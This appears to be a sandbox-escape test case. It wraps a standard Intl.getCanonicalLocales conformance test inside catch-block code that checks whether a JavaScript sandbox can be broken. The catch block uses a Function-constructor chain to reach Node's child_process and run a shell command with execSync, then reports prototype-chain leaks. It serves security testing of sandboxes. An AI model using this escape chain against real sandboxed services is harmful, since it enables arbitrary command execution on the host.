try {
    const tag = 'ar';
    const tag2 = 'fa';
    const tag3 = 'zh';
    const loc = new Intl.Locale(tag);
    class PatchedLocale extends Intl.Locale {
        constructor(tag, options) {
            throw () => {
                return () => {
                };
            };
            super(tag, options);
        }
        toString() {
            assert(false, 'toString should not be called');
        }
    }
    const ploc = new PatchedLocale(tag2);
    let res = Intl.getCanonicalLocales(loc);
    assert.sameValue(res.length, 1);
    assert.sameValue(res[0], tag);
    res = Intl.getCanonicalLocales(ploc);
    assert.sameValue(res.length, 1);
    assert.sameValue(res[0], tag2);
    res = Intl.getCanonicalLocales([
        loc,
        tag3,
        ploc
    ]);
    assert.sameValue(res.length, 3);
    assert.sameValue(res[0], tag);
    assert.sameValue(res[1], tag3);
    assert.sameValue(res[2], tag2);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}